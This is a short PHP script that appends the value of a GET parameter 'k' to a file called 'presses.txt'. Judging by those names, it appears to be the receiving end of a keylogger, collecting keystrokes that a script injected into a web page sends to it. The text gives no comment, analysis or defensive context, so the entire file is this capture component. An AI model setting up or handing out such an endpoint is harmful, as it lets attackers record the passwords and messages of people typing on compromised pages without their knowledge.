<?php
if (!empty($_GET['k'])) {
  $file = fopen('presses.txt', 'a+');
  fwrite($file, $_GET['k'] . PHP_EOL);
  fclose($file);
}
?>